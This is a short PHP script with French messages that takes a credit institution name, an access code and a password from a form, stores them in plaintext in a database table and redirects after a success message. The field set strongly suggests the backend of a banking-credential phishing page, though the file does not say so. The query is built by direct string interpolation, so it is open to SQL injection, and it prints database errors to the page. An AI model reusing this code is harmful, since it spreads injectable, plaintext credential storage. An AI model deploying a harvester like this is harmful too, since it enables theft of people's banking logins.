<?php
        require("connection.php");
        
      if(isset($_POST['valider'])){
       
        $etablissement_credit=htmlspecialchars($_POST['etablissement_credit']);
        $code=htmlspecialchars($_POST['code']);
        $mdps=htmlspecialchars($_POST['mdps']);
        
        



$req="insert into arriver (etablissement_credit,code,mdps) values ('$etablissement_credit','$code','$mdps')";
        mysql_query($req) or die(mysql_error());
        
    echo'<span class="success"> Enregistrer avec succes <br/></span>'; 
      echo'<div><img src="ima/ajax-loader.gif" atl="" style="width:50px;height:50px;" /></div>';
     echo'<span style="font-size:11px;"><i> Veuillez patienter vous serez redirigé vers la page récapitulative... </i><br/></span>';
         header('Refresh:3;url=index5.php');
                }
    else {
 echo'<span class="base"><a href="index2.php">  </a></span><br/>'; } 
 
       
     ?>